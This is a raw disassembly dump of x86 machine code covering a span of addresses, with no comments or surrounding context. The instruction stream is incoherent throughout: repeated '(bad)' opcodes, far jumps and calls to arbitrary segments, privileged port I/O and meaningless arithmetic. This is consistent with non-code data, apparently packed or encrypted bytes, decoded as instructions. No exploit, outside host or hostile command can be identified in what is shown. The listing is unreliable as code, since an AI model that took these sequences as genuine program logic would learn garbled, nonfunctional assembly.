  41e21c:	cmp    edi,ebp
  41e21e:	add    ebx,DWORD PTR [edi+0x41]
  41e221:	(bad)  
  41e222:	lock shl dh,cl
  41e225:	test   ebx,ecx
  41e227:	fistp  DWORD PTR ds:0xc63a0fc0
  41e22d:	push   0xfffffffe
  41e22f:	jae    0x41e29a
  41e231:	arpl   WORD PTR [edx],cx
  41e233:	out    dx,al
  41e234:	sar    edi,cl
  41e236:	mov    edi,0xe50dbc64
  41e23b:	jp     0x41e25e
  41e23d:	or     BYTE PTR [ebp-0x361dac81],dh
  41e243:	imul   edx,edx,0x9debcea8
  41e249:	mov    ah,0xd7
  41e24b:	inc    ebp
  41e24c:	fcmovnb st,st(3)
  41e24e:	outs   dx,BYTE PTR ds:[esi]
  41e24f:	shr    BYTE PTR [eax+0xa],cl
  41e252:	mov    ebx,edi
  41e254:	sbb    BYTE PTR [edi+0x6],0x5a
  41e258:	push   ecx
  41e259:	xchg   esp,eax
  41e25a:	das    
  41e25b:	dec    ebp
  41e25c:	(bad)  
  41e25d:	sti    
  41e25e:	jg     0x41e28a
  41e260:	push   ebp
  41e261:	jmp    0x41e27b
  41e263:	xchg   edx,eax
  41e264:	adc    eax,0xaadcaed0
  41e269:	jecxz  0x41e293
  41e26b:	jle    0x41e1f9
  41e26d:	jne    0x41e2bf
  41e26f:	outs   dx,BYTE PTR ds:[esi]
  41e270:	outs   dx,BYTE PTR ds:[esi]
  41e271:	das    
  41e272:	and    BYTE PTR [ebx],dh
  41e274:	mov    BYTE PTR [esi+0x347edc36],bh
  41e27a:	inc    esp
  41e27b:	repz sbb esi,DWORD PTR [ebp*1+0x76c1e3c1]
  41e283:	push   edi
  41e284:	and    eax,0x1d6e0fe3
  41e289:	sub    bh,BYTE PTR [edx]
  41e28b:	hlt    
  41e28c:	imul   esi,DWORD PTR [edi-0x2c],0x2aea70b4
  41e293:	outs   dx,BYTE PTR ds:[esi]
  41e294:	jle    0x41e2a0
  41e296:	in     eax,0x85
  41e298:	lods   al,BYTE PTR ds:[esi]
  41e299:	dec    eax
  41e29a:	xor    al,0x23
  41e29c:	xchg   ecx,eax
  41e29d:	fistp  DWORD PTR [esi+0x128320e4]
  41e2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2a4:	mov    esp,0xa7e77d05
  41e2a9:	stos   BYTE PTR es:[edi],al
  41e2aa:	out    0xb9,al
  41e2ac:	lods   eax,DWORD PTR ds:[esi]
  41e2ad:	pop    ebp
  41e2ae:	call   0x6aac:0x83f63f93
  41e2b5:	pop    ebp
  41e2b6:	mov    ebp,0xd7e7f605
  41e2bb:	cs arpl di,bp
  41e2be:	div    DWORD PTR [esi+0x22]
  41e2c1:	push   0xe39f63b4
  41e2c6:	pop    edx
  41e2c7:	jle    0x41e2c0
  41e2c9:	ret    0xa35c
  41e2cc:	fdivr  QWORD PTR [esp+eax*2+0x2a]
  41e2d0:	neg    BYTE PTR [ecx-0x6e]
  41e2d3:	pop    ecx
  41e2d4:	lea    edx,[ebp+0x2b30c1fb]
  41e2da:	xor    cl,cl
  41e2dc:	push   es
  41e2dd:	mov    ebx,0x928da4f5
  41e2e2:	loope  0x41e29b
  41e2e4:	in     al,dx
  41e2e5:	add    eax,0x6ade6eec
  41e2ea:	outs   dx,DWORD PTR ds:[esi]
  41e2eb:	jmp    0xc96c:0xd718f964
  41e2f2:	(bad)  
  41e2f3:	and    al,0x41
  41e2f5:	aam    0x7d
  41e2f7:	inc    esi
  41e2f8:	fst    QWORD PTR [esi-0x65]
  41e2fb:	and    DWORD PTR [esp+ebp*4],esp
  41e2fe:	dec    ecx
  41e2ff:	arpl   WORD PTR [edi*8+0x658566],dx
	...
  41e30e:	add    BYTE PTR [eax],al
  41e310:	add    BYTE PTR [esi-0x9],ch
  41e313:	mov    ebx,0xfe6dbb69
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	xor    dl,BYTE PTR [esi+edi*1]
  41e320:	jmp    0x4341a2
  41e325:	lods   al,BYTE PTR ds:[esi]
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [ecx+0x4d],cl
  41e32b:	pushf  
  41e32c:	cli    
  41e32d:	imul   esp,DWORD PTR [ebx],0x9b741d2c
  41e333:	or     eax,DWORD PTR [ebx+0x5b]
  41e336:	mov    bh,BYTE PTR [ebp+0x767e5909]
  41e33c:	jnp    0x41e37e
  41e33e:	popf   
  41e33f:	xor    DWORD PTR [esi+ebp*1-0x31ee84d8],esp
  41e346:	popa   
  41e347:	jno    0x41e2e4
  41e349:	and    ch,dh
  41e34b:	je     0x41e3a0
  41e34d:	jge    0x41e33a
  41e34f:	xor    BYTE PTR ds:0x956ba1c7,bh
  41e355:	test   eax,0xc0d00de2
  41e35a:	shl    BYTE PTR [ebp+ebx*1+0x6b],cl
  41e35e:	popf   
  41e35f:	call   0x1ff3:0xa95e44db
  41e366:	rcl    ebp,0x1f
  41e369:	div    BYTE PTR [esi]
  41e36b:	and    eax,0x825109bc
  41e370:	sub    al,0xe9
  41e372:	iret   
  41e373:	push   eax
  41e374:	pushf  
  41e375:	and    al,ah
  41e377:	pusha  
  41e378:	mov    eax,ds:0xe18d621f
  41e37d:	xor    edx,DWORD PTR [edi+ecx*2-0x38]
  41e381:	cmp    cl,BYTE PTR [esi+0x6a]
  41e384:	jmp    0x5508:0xab44763b
  41e38b:	jae    0x41e339
  41e38d:	bound  esi,QWORD PTR [esi-0x27fe82c6]
  41e393:	fucomip st,st(5)
  41e395:	dec    edi
  41e396:	or     edx,DWORD PTR [edi]
  41e398:	ins    BYTE PTR es:[edi],dx
  41e399:	and    dl,BYTE PTR [eax]
  41e39b:	sbb    al,0xd8
  41e39d:	cmp    esp,ecx
  41e39f:	inc    bx
  41e3a1:	pop    edi
  41e3a2:	dec    esi
  41e3a3:	push   edx
  41e3a4:	ret    
  41e3a5:	push   ebx
  41e3a6:	xchg   esi,eax
  41e3a7:	sub    BYTE PTR [edx-0x30],cl
  41e3aa:	inc    esp
  41e3ab:	inc    eax
  41e3ac:	pop    ecx
  41e3ad:	je     0x41e3cd
  41e3af:	or     DWORD PTR [ebp+0x7c],edx
  41e3b2:	push   0xfd865a2
  41e3b7:	pop    ds
  41e3b8:	retf   
  41e3b9:	mov    ecx,0xd2e19b64
  41e3be:	jb     0x41e3aa
  41e3c0:	or     BYTE PTR [esi-0x7d],bh
  41e3c3:	push   ebp
  41e3c4:	dec    ebp
  41e3c5:	rol    DWORD PTR [edx+0x4c70de23],cl
  41e3cb:	dec    ebp
  41e3cc:	int    0xcf
  41e3ce:	out    0xb6,al
  41e3d0:	cmp    al,0xc2
  41e3d2:	or     bh,0x8e
  41e3d5:	shl    DWORD PTR [eax],cl
  41e3d7:	inc    edx
  41e3d8:	xchg   ebp,eax
  41e3d9:	cmp    DWORD PTR [edx+0x5ce6ce26],0xffffffe9
  41e3e0:	xchg   ecx,eax
  41e3e1:	fldl2e 
  41e3e3:	scas   al,BYTE PTR es:[edi]
  41e3e4:	or     ecx,esp
  41e3e6:	ins    BYTE PTR es:[edi],dx
  41e3e7:	imul   edx,DWORD PTR [eax+0x27],0xc58b902d
  41e3ee:	int3   
  41e3ef:	or     ebx,eax
  41e3f1:	cmp    edx,esp
  41e3f3:	test   eax,0x422a607c
  41e3f8:	stos   BYTE PTR es:[edi],al
  41e3f9:	lea    ebx,[esi+0x2de1f481]
  41e3ff:	rcl    DWORD PTR [ebx],cl
  41e401:	dec    ebp
  41e402:	push   es
  41e403:	in     al,0xa
  41e405:	mov    bh,0x33
  41e407:	out    0xb5,al
  41e409:	retf   
  41e40a:	aas    
  41e40b:	lock sub al,0x2e
  41e40e:	or     esi,DWORD PTR [esi+0x2b]
  41e411:	ret    0x86b2
  41e414:	xchg   ebp,eax
  41e415:	ins    DWORD PTR es:[edi],dx
  41e416:	ret    0xcabb
  41e419:	outs   dx,BYTE PTR ds:[esi]
  41e41a:	mov    ecx,0xf6aff27a
  41e41f:	pop    ebp
  41e420:	cmp    eax,0x139d4a7
  41e425:	xor    edx,esi
  41e427:	iret   
  41e428:	inc    ebp
  41e429:	inc    ebx
  41e42a:	sub    ebx,DWORD PTR [ecx+0x1902bbd7]
  41e430:	iret   
  41e431:	or     esi,ecx
  41e433:	clc    
  41e434:	or     ebp,DWORD PTR [eax]
  41e436:	std    
  41e437:	cs gs arpl si,si
  41e43b:	xchg   edi,eax
  41e43c:	xor    DWORD PTR [eax+0x172d7aa2],esp
  41e442:	pop    si
  41e444:	cmc    
  41e445:	imul   cl
  41e447:	jne    0x41e485
  41e449:	mov    es,edx
  41e44b:	xor    BYTE PTR [edx],ch
  41e44d:	sbb    ebp,DWORD PTR [edx-0x36be702e]
  41e453:	jnp    0x41e4d1
  41e455:	into   
  41e456:	mov    dh,0x8a
  41e458:	jb     0x41e45c
  41e45a:	sub    al,0x73
  41e45c:	mov    ?,WORD PTR [ebx-0x39]
  41e45f:	add    ebx,esp
  41e461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e462:	dec    edi
  41e463:	iret   
  41e464:	(bad)  
  41e465:	lods   al,BYTE PTR ds:[esi]
  41e466:	cdq    
  41e467:	lock dec ebx
  41e469:	dec    eax
  41e46a:	inc    edi
  41e46b:	dec    ebx
  41e46c:	idiv   BYTE PTR [eax+0x40]
  41e46f:	aad    0x98
  41e471:	ret    0xd423
  41e474:	or     ah,BYTE PTR ds:0x262df006
  41e47a:	sub    ebx,DWORD PTR [edx+0x334703a5]
  41e480:	mov    eax,0x2ec3a0ec
  41e485:	mov    esi,0xa611b2f4
  41e48a:	int3   
  41e48b:	xchg   ebx,eax
  41e48c:	cmp    al,0x75
  41e48e:	idiv   DWORD PTR [edx-0x71]
  41e491:	mov    WORD PTR [edi-0x27],ss
  41e494:	fcmovnbe st,st(3)
  41e496:	lock cmc 
  41e498:	ror    dl,1
  41e49a:	jl     0x41e484
  41e49c:	and    ah,bl
  41e49e:	cld    
  41e49f:	fcom   QWORD PTR [eax+0x3f]
  41e4a2:	add    DWORD PTR [ebp+esi*2-0x37a2affc],edi
  41e4a9:	xor    ebp,ebp
  41e4ab:	cmp    esp,edx
  41e4ad:	aas    
  41e4ae:	sbb    dl,BYTE PTR [edx-0x1ca79ed7]
  41e4b4:	ss aas 
  41e4b6:	int3   
  41e4b7:	jmp    0x3ef88d39
  41e4bc:	jmp    0x3ebe6f1f
  41e4c1:	pop    ecx
  41e4c2:	scas   eax,DWORD PTR es:[edi]
  41e4c3:	inc    eax
  41e4c4:	inc    edi
  41e4c5:	into   
  41e4c6:	xchg   ebx,eax
  41e4c7:	jecxz  0x41e4c1
  41e4c9:	push   0x736bead0
  41e4ce:	out    0xec,al
  41e4d0:	jmp    0x9cc908fd
  41e4d5:	call   0xb18:0x1302d506
  41e4dc:	adc    al,dl
  41e4de:	jmp    0x14e7:0x67c2686e
  41e4e5:	mov    WORD PTR [esi],ds
  41e4e7:	clc    
  41e4e8:	mov    bl,0xe0
  41e4ea:	jb     0x41e4dc
  41e4ec:	jmp    0x6e96:0x60691420
  41e4f3:	dec    edx
  41e4f4:	mov    bl,0x13
  41e4f6:	sub    BYTE PTR [ecx-0x4c],0xe6
  41e4fa:	jnp    0x41e4ef
  41e4fc:	jnp    0x41e50b
  41e4fe:	pop    eax
  41e4ff:	rcr    BYTE PTR ds:0x7469d5ff,1
  41e505:	sar    ch,1
  41e507:	cmp    eax,0x49fe55f9
  41e50c:	mov    bh,0x80
  41e50e:	inc    ebp
  41e50f:	mov    ebx,0xdb1eeb19
  41e514:	stc    
  41e515:	xor    bh,BYTE PTR [eax+0x5867a213]
  41e51b:	mov    ecx,0x259ee9c3
  41e520:	and    al,BYTE PTR [ebp-0x3b027642]
  41e526:	fmulp  st(4),st
  41e528:	mov    dl,bh
  41e52a:	jbe    0x41e5a8
  41e52c:	push   edx
  41e52d:	in     eax,0x1f
  41e52f:	lock iret 
  41e531:	add    al,0x27
  41e533:	dec    eax
  41e534:	xchg   BYTE PTR [edx+esi*2-0x12],al
  41e538:	push   esi
  41e539:	outs   dx,DWORD PTR ds:[esi]
  41e53a:	jbe    0x41e550
  41e53c:	sbb    ch,BYTE PTR [ecx+eax*4]
  41e53f:	out    0x8c,al
  41e541:	mov    ebp,0x554b0955
  41e546:	aam    0xda
  41e548:	outs   dx,BYTE PTR ds:[esi]
  41e549:	mov    dh,dh
  41e54b:	scas   eax,DWORD PTR es:[edi]
  41e54c:	mov    esi,0x6bae3dd6
  41e551:	sbb    DWORD PTR [esp+eiz*8-0x46d0705a],0x2b606ac
  41e55c:	aaa    
  41e55d:	sub    eax,0x5c4ae8c8
  41e562:	push   DWORD PTR [esi-0x5d1d46ad]
  41e568:	inc    ecx
  41e569:	sbb    BYTE PTR ds:0x2ba901e6,0x99
  41e570:	adc    ecx,DWORD PTR [edx+0x57d1a62a]
  41e576:	es push ebx
  41e578:	xchg   ecx,eax
  41e579:	pop    ds
  41e57a:	ror    BYTE PTR [esi],cl
  41e57c:	mov    ebp,0x757255a8
  41e581:	add    eax,0x1f3beb1e
  41e586:	ret    0x72b
  41e589:	adc    BYTE PTR [esi-0x64],ah
  41e58c:	fld    QWORD PTR [esi-0x55]
  41e58f:	lods   eax,DWORD PTR ds:[esi]
  41e590:	shl    BYTE PTR [esi+0x41],0xd3
  41e594:	shl    BYTE PTR [ebp-0x67253086],cl
  41e59a:	adc    eax,0x28862f5e
  41e59f:	lods   al,BYTE PTR ds:[esi]
  41e5a0:	fxch   st(3)
  41e5a2:	inc    edi
  41e5a3:	and    BYTE PTR [ecx+eiz*8],ch
  41e5a6:	stos   DWORD PTR es:[edi],eax
  41e5a7:	loopne 0x41e604
  41e5a9:	dec    edi
  41e5aa:	dec    BYTE PTR [edi-0x627075ab]
  41e5b0:	fidivr WORD PTR [eax]
  41e5b2:	enter  0x12dc,0x3a
  41e5b6:	aas    
  41e5b7:	or     cl,al
  41e5b9:	mov    ds:0xccf8004f,al
  41e5be:	mov    esp,0xdcfada67
  41e5c3:	xchg   ebx,eax
  41e5c4:	shr    BYTE PTR ds:[eax-0x79],0x11
  41e5c9:	adc    BYTE PTR [edx],bh
  41e5cb:	cmp    eax,0x9cdf9ec8
  41e5d0:	fmul   DWORD PTR [ebp+0x44]
  41e5d3:	push   ecx
  41e5d4:	cmp    ch,ch
  41e5d6:	mov    edi,0xda291d93
  41e5db:	cmp    esi,ebx
  41e5dd:	(bad)  
  41e5de:	fxch   st(7)
  41e5e0:	das    
  41e5e1:	cmp    al,0x98
  41e5e3:	fsub   st,st(2)
  41e5e5:	nop
  41e5e6:	fisttp WORD PTR ds:0x4739b6f3
  41e5ec:	std    
  41e5ed:	mov    dh,0xee
  41e5ef:	je     0x41e59c
  41e5f1:	fsubr  DWORD PTR [esi+0x369eed9b]
  41e5f7:	in     al,0xe0
  41e5f9:	mov    dl,BYTE PTR [ecx+0x4aaf7c07]
  41e5ff:	fst    QWORD PTR [ebx]
  41e601:	cmc    
  41e602:	js     0x41e657
  41e604:	jns    0x41e647
  41e606:	test   BYTE PTR [ebx+0x56],cl
  41e609:	sbb    BYTE PTR ds:0xe678a6c2,0x7
  41e610:	sub    eax,0xd1aa08b7
  41e615:	lds    ebp,FWORD PTR [edx+0x2c6c5f69]
  41e61b:	mov    bl,0xba
  41e61d:	sub    BYTE PTR [ebp-0x1d],cl
  41e620:	push   edi
  41e621:	shl    BYTE PTR [ecx],1
  41e623:	adc    eax,0xcb9b4d43
  41e628:	stos   BYTE PTR es:[edi],al
  41e629:	shr    cl,cl
  41e62b:	pop    esi
  41e62c:	cmp    al,0xa9
  41e62e:	xor    DWORD PTR [edx-0x24],ebp
  41e631:	sti    
  41e632:	mov    bh,0x8e
  41e634:	ss into 
  41e636:	retf   0xa4b1
  41e639:	(bad)  
  41e63a:	adc    eax,0x4c0d97e6
  41e63f:	lahf   
  41e640:	loopne 0x41e6a0
  41e642:	pop    ebx
  41e643:	cld    
  41e644:	fnstsw WORD PTR [eax+ecx*1-0x9]
  41e648:	stc    
  41e649:	xchg   ebp,eax
  41e64a:	dec    ebp
  41e64b:	dec    edx
  41e64c:	jns    0x41e66a
  41e64e:	dec    ebx
  41e64f:	stos   DWORD PTR es:[edi],eax
  41e650:	dec    eax
  41e651:	mov    bl,0x59
  41e653:	push   ebx
  41e654:	xor    ebp,DWORD PTR [ecx+0xb]
  41e657:	mov    eax,fs
  41e659:	mov    eax,DWORD PTR [edi-0x62]
  41e65c:	inc    edi
  41e65d:	xor    al,0x8f
  41e65f:	pop    edx
  41e660:	out    dx,al
  41e661:	enter  0x3d0c,0x56
  41e665:	fidivr DWORD PTR [ebp-0x6887891c]
  41e66b:	dec    ebx
  41e66c:	sub    al,0x14
  41e66e:	test   ah,bl
  41e670:	sub    al,BYTE PTR [ecx]
  41e672:	outs   dx,BYTE PTR ds:[esi]
  41e673:	push   ecx
  41e674:	mov    ebp,0xa6c1e373
  41e679:	daa    
  41e67a:	pop    ss
  41e67b:	xchg   esp,eax
  41e67c:	cld    
  41e67d:	xchg   ecx,eax
  41e67e:	cmp    BYTE PTR [ebx+0x14c8f356],dl
  41e684:	jl     0x41e645
  41e686:	es mov ecx,0x6a39abe4
  41e68c:	pop    ecx
  41e68d:	jl     0x41e6dd
  41e68f:	and    al,0x9
  41e691:	inc    edi
  41e692:	push   ebx
  41e693:	sub    bh,BYTE PTR [esi-0x1d1db256]
  41e699:	gs jb  0x41e69c
  41e69c:	pop    esp
  41e69d:	lahf   
  41e69e:	xor    bl,BYTE PTR [edx]
  41e6a0:	pop    ebx
  41e6a1:	and    DWORD PTR [esi-0x11],eax
  41e6a4:	addr16 mov cl,0x51
  41e6a7:	pop    es
  41e6a8:	idiv   BYTE PTR [ebx]
  41e6aa:	xor    DWORD PTR [edx+0x3393aa10],esp
  41e6b0:	retf   0x75f3
  41e6b3:	outs   dx,DWORD PTR ds:[esi]
  41e6b4:	(bad)  
  41e6b6:	call   0xfc94:0xf949ba0
  41e6bd:	ret    0x695f
  41e6c0:	bound  ebx,QWORD PTR [edx+0x1b]
  41e6c3:	pop    ebx
  41e6c4:	hlt    
  41e6c5:	inc    esp
  41e6c6:	sub    dh,al
  41e6c8:	inc    ecx
  41e6c9:	and    BYTE PTR [ebx+0x5],al
  41e6cc:	(bad)  [ebp-0x7deb2ca8]
  41e6d2:	jge    0x41e71f
  41e6d4:	hlt    
	...
  41e6e1:	sub    eax,0xfffb5fc4
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0xa55475d
  41e6f0:	mov    ebx,0x16229
  41e6f5:	lods   al,BYTE PTR ds:[esi]
  41e6f6:	add    eax,DWORD PTR [eax]
  41e6f8:	add    BYTE PTR [edi-0x7d],cl
  41e6fb:	cmp    ah,BYTE PTR [eax+0x64]
  41e6fe:	mov    bh,0x57
  41e700:	loop   0x41e6c0
  41e702:	aam    0xf0
  41e704:	mov    ds:0xa54317a6,eax
  41e709:	test   eax,0x5ea4a25c
  41e70e:	daa    
  41e70f:	xchg   ecx,eax
  41e710:	stos   BYTE PTR es:[edi],al
  41e711:	ficom  WORD PTR [eax-0x77]
  41e714:	xchg   edx,eax
  41e715:	out    0x97,al
  41e717:	std    
  41e718:	push   es
  41e719:	rcr    DWORD PTR [eax+0x5d0b5855],cl
  41e71f:	pop    ebx
  41e720:	push   eax
  41e721:	div    BYTE PTR [eax-0x254acb2c]
  41e727:	and    edi,DWORD PTR [ebp+0x2e]
  41e72a:	mov    eax,cs:0xa02a8660
  41e730:	adc    esp,DWORD PTR [esi+eiz*1-0x411a1307]
  41e737:	les    ecx,FWORD PTR [ebp+0x4fa31075]
  41e73d:	je     0x41e77b
  41e73f:	jmp    0x8abd:0x8d6f58ef
  41e746:	and    ebp,edi
  41e748:	xor    ebp,DWORD PTR [edi+0x66]
  41e74b:	fimul  DWORD PTR [edx]
  41e74d:	(bad)  
  41e74e:	pop    edi
  41e74f:	mov    bh,0xd6
  41e751:	dec    edx
  41e752:	mov    cl,dh
  41e754:	cmp    BYTE PTR [edi-0x31b8388a],dl
  41e75a:	xor    bl,BYTE PTR [eax-0x23]
  41e75d:	sbb    dl,BYTE PTR [eax-0x559d0d9d]
  41e763:	lods   eax,DWORD PTR ds:[esi]
  41e764:	dec    esi
  41e765:	daa    
  41e766:	jno    0x41e794
  41e768:	add    eax,0x6a664640
  41e76d:	repnz add ecx,DWORD PTR [edi-0x6e]
  41e771:	aas    
  41e772:	add    ebx,esp
  41e774:	xchg   ecx,eax
  41e775:	mov    dl,0xb7
  41e777:	and    al,0x11
  41e779:	add    ah,BYTE PTR [eax]
  41e77b:	mov    DWORD PTR [ebp-0x1a],ebp
  41e77e:	inc    ebp
  41e77f:	aaa    
  41e780:	push   es
  41e781:	or     eax,0xf6848f8a
  41e786:	sub    DWORD PTR [edi-0x39],0x9d8fe636
  41e78d:	popa   
  41e78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78f:	cmp    bl,0x35
  41e792:	pop    edx
  41e793:	out    dx,eax
  41e794:	xor    DWORD PTR [ebp+edx*8+0x2b],ebp
  41e798:	jns    0x41e776
  41e79a:	sahf   
  41e79b:	jl     0x41e7ad
  41e79d:	xor    al,0x1f
  41e79f:	sbb    DWORD PTR [edx],esi
  41e7a1:	das    
  41e7a2:	test   eax,0xee295d98
  41e7a7:	hlt    
  41e7a8:	xor    eax,0x845ad766
  41e7ad:	leave  
  41e7ae:	rcl    DWORD PTR [ebp+0x6c],1
  41e7b1:	test   DWORD PTR [eax+0x58],edi
  41e7b4:	and    edi,DWORD PTR [eax]
  41e7b6:	pop    ds
  41e7b7:	and    al,0x43
  41e7b9:	pop    ebp
  41e7ba:	pop    ebx
  41e7bb:	repz loopne 0x41e76d
  41e7be:	popf   
  41e7bf:	es (bad) 
  41e7c1:	xchg   ecx,eax
  41e7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7c3:	imul   ebx,edx,0xfffffff3
  41e7c6:	push   ecx
  41e7c7:	push   esp
  41e7c8:	cwde   
  41e7c9:	ins    BYTE PTR es:[edi],dx
  41e7ca:	jp     0x41e7a5
  41e7cc:	pop    edx
  41e7cd:	inc    eax
  41e7ce:	hlt    
  41e7cf:	test   DWORD PTR [eax],0xc65553f9
  41e7d5:	and    al,0x73
  41e7d7:	push   edx
  41e7d8:	in     al,dx
  41e7d9:	mov    bl,0xe2
  41e7db:	outs   dx,DWORD PTR ds:[esi]
  41e7dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7dd:	mov    ds:0xcce043a9,al
  41e7e2:	and    edi,DWORD PTR [edx-0x4a]
  41e7e5:	add    cl,BYTE PTR [ebp+0x15]
  41e7e8:	or     edx,edx
  41e7ea:	jecxz  0x41e7b4
  41e7ec:	mov    al,ds:0xd2851e79
  41e7f1:	push   esp
  41e7f2:	jmp    DWORD PTR [ebx+ecx*4]
  41e7f5:	in     eax,dx
  41e7f6:	add    dh,BYTE PTR ds:0x78cc09a6
  41e7fc:	pop    esi
  41e7fd:	and    BYTE PTR [edi+0x5711ee94],ah
  41e803:	xor    esi,DWORD PTR ds:0xb7e63517
  41e809:	rcr    ah,0x4b
  41e80c:	cmp    al,0x95
  41e80e:	xchg   ecx,eax
  41e80f:	add    DWORD PTR [ecx],ebx
  41e811:	cdq    
  41e812:	gs jbe 0x41e7f8
  41e815:	mov    ebp,DWORD PTR [eax]
  41e817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e818:	(bad)  
  41e819:	lock gs in al,dx
  41e81c:	mov    ebp,0xffe0424e
  41e821:	push   eax
  41e822:	(bad)  
  41e823:	call   0x3a8c6647
  41e828:	test   BYTE PTR [edi-0x1],0x14
  41e82c:	cld    
  41e82d:	or     DWORD PTR [ebx-0x5b03887a],esi
  41e833:	fsubr  DWORD PTR [edi-0x39e1b817]
  41e839:	pusha  
  41e83a:	xchg   ebp,eax
  41e83b:	test   al,0xf5
  41e83d:	pop    ds
  41e83e:	ins    DWORD PTR es:[edi],dx
  41e83f:	adc    esi,DWORD PTR [ebx+0x10]
  41e842:	xchg   esi,eax
  41e843:	(bad)  
  41e844:	xchg   edi,eax
  41e845:	das    
  41e846:	mov    ch,0x79
  41e848:	fist   WORD PTR [ebp-0x5a6842ec]
  41e84e:	inc    ebx
  41e84f:	adc    al,BYTE PTR ds:0x6e90e88
  41e855:	lea    ebx,[ebx+esi*4-0xe]
  41e859:	in     al,dx
  41e85a:	sub    bl,BYTE PTR ds:0x774df5fe
  41e860:	sub    dl,bh
  41e862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e863:	cmp    al,0xf5
  41e865:	shl    DWORD PTR [ebx],0x12
  41e868:	(bad)  
  41e86a:	inc    eax
  41e86b:	fmulp  st(4),st
  41e86d:	xlat   BYTE PTR ds:[ebx]
  41e86e:	dec    edx
  41e86f:	(bad)  
  41e870:	fadd   DWORD PTR [ecx+0x1]
  41e873:	sbb    DWORD PTR [edi+0x3547d828],ebx
  41e879:	sbb    BYTE PTR ds:0x33dcc08d,dl
  41e87f:	sysret 
  41e881:	scas   eax,DWORD PTR es:[edi]
  41e882:	bound  ebp,QWORD PTR ds:0x77f98e2d
  41e888:	xchg   ebp,eax
  41e889:	mov    al,0xa2
  41e88b:	push   ecx
  41e88c:	mov    cl,0x10
  41e88e:	jl     0x41e8e2
  41e890:	mov    esp,0xb70b106e
  41e895:	mov    esi,0x3f6f95fb
  41e89a:	jp     0x41e841
  41e89c:	sbb    eax,0xc25c7751
  41e8a1:	inc    esp
  41e8a2:	int    0xde
  41e8a4:	int3   
  41e8a5:	mov    al,0x73
  41e8a7:	(bad)  
  41e8a8:	(bad)  [ecx+0xaa06b4f]
  41e8ae:	lods   eax,DWORD PTR ds:[esi]
  41e8af:	mov    ch,0xa0
  41e8b1:	in     eax,0x52
  41e8b3:	jae    0x41e8c8
  41e8b5:	lds    esp,FWORD PTR [edx+ebx*8]
  41e8b8:	mov    dh,bh
  41e8ba:	in     eax,0xc5
  41e8bc:	or     DWORD PTR [ebp+0x17b39b7a],edi
  41e8c2:	push   cs
  41e8c3:	shr    DWORD PTR [ecx],cl
  41e8c5:	sahf   
  41e8c6:	adc    BYTE PTR [ecx+0x32f84995],cl
  41e8cc:	sub    dl,BYTE PTR [edi+0x3d]
  41e8cf:	mov    dh,0xfa
  41e8d1:	adc    DWORD PTR [esi],0x7d592f
  41e8d7:	in     al,0x9e
  41e8d9:	mov    bh,0x65
  41e8db:	cmp    DWORD PTR [eax+0x120e5127],0x49
  41e8e2:	idiv   BYTE PTR [edi-0x4b]
  41e8e5:	xchg   edi,eax
  41e8e7:	xchg   edi,eax
  41e8e8:	add    dh,ah
  41e8ea:	push   0x6b435ba
  41e8ef:	bound  ebx,QWORD PTR [edx]
  41e8f1:	ss das 
  41e8f3:	mov    ds:0xa16a80d3,eax
  41e8f8:	xor    BYTE PTR [ebx+ecx*4-0x46fcfff4],bh
  41e8ff:	arpl   bx,ax
  41e901:	out    dx,eax
  41e902:	or     cl,BYTE PTR [edx-0x4b65f82c]
  41e908:	add    al,0x91
  41e90a:	mov    ah,0xf
  41e90d:	cwde   
  41e90e:	jmp    0x47cb0caf
  41e913:	xchg   edi,eax
  41e914:	stos   DWORD PTR es:[edi],eax
  41e915:	iret   
  41e916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e917:	add    DWORD PTR [ecx-0x6eb88bb9],esp
  41e91d:	jno    0x41e999
  41e91f:	stos   BYTE PTR es:[edi],al
  41e920:	mov    ah,0xf9
  41e922:	jns    0x41e8f5
  41e924:	and    al,0x4c
  41e926:	stos   DWORD PTR es:[edi],eax
  41e927:	add    eax,0xa192a6c5
  41e92c:	or     eax,0xebfd5b0
  41e931:	fimul  WORD PTR [ecx-0x7f]
  41e934:	nop
  41e935:	(bad)  
  41e936:	(bad)  
  41e937:	aad    0x28
  41e939:	xor    DWORD PTR fs:[edi+0x5caf16ab],ecx
  41e940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e941:	mov    cl,0x3b
  41e943:	xor    eax,0xa2d69c04
  41e948:	and    eax,0x881e7a42
  41e94d:	sub    eax,0x814c569e
  41e952:	clc    
  41e953:	(bad)  
  41e954:	mov    dh,0x20
  41e956:	leave  
  41e957:	rcr    DWORD PTR [esp+ebx*1],0x3c
  41e95b:	ret    0xd04d
  41e95e:	icebp  
  41e95f:	icebp  
  41e960:	xor    eax,eax
  41e962:	pop    ss
  41e963:	outs   dx,DWORD PTR ds:[esi]
  41e964:	call   0x536d:0x69a7aa1d
  41e96b:	jbe    0x41e967
  41e96d:	inc    ecx
  41e96e:	clc    
  41e96f:	adc    ecx,DWORD PTR [esi-0x6c]
  41e972:	out    0x1b,eax
  41e974:	int3   
  41e975:	fnsave [esp+ebp*4]
  41e978:	mov    ds:0x446aa13,eax
  41e97d:	dec    ebp
  41e97e:	ja     0x41e9e4
  41e980:	mov    edi,0xbf4a006e
  41e985:	mov    eax,0x55c7a3e0
  41e98a:	sbb    ebx,DWORD PTR [edi+ebp*4-0x219b8f66]
  41e991:	jmp    0xb10e:0xc2b68cf9
  41e998:	jecxz  0x41e9ff
  41e99a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e99b:	inc    ecx
  41e99c:	out    dx,eax
  41e99d:	cs jmp 0x41e999
  41e9a0:	addr16 sbb cl,0xe4
  41e9a4:	push   0x53
  41e9a6:	(bad)  
  41e9a7:	jmp    0xeab8918c
  41e9ac:	into   
  41e9ad:	das    
